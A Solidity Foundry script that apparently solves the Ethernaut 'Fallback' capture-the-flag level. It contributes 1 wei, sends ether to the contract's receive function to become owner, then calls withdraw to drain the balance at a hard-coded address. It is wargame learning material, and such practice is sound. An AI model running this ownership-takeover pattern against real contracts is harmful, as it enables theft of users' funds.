// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import {Fallback} from "../../src/ethernaut/fallback.sol";

contract fallbackhack is Script {
    Fallback fallBack =
        Fallback(payable(0xCfBD759fb69E06879A9618dd30a8FF9Ad6B24C90));

    function run() external {
        vm.startBroadcast();
        //call the contribute() and send 1 wie: create a balance to be allowed to call the receive function
        //send ether to invoke receive(): that will set you as the owner
        //check if you are the owner
        //call withdraw function : that only the owner allow to call
        fallBack.contribute{value: 1 wei}();
        (bool y, ) = address(fallBack).call{value: 1 wei}("");
        require(y, "couldn't send ether to the contract");
        fallBack.withdraw();
        vm.stopBroadcast();
    }
}
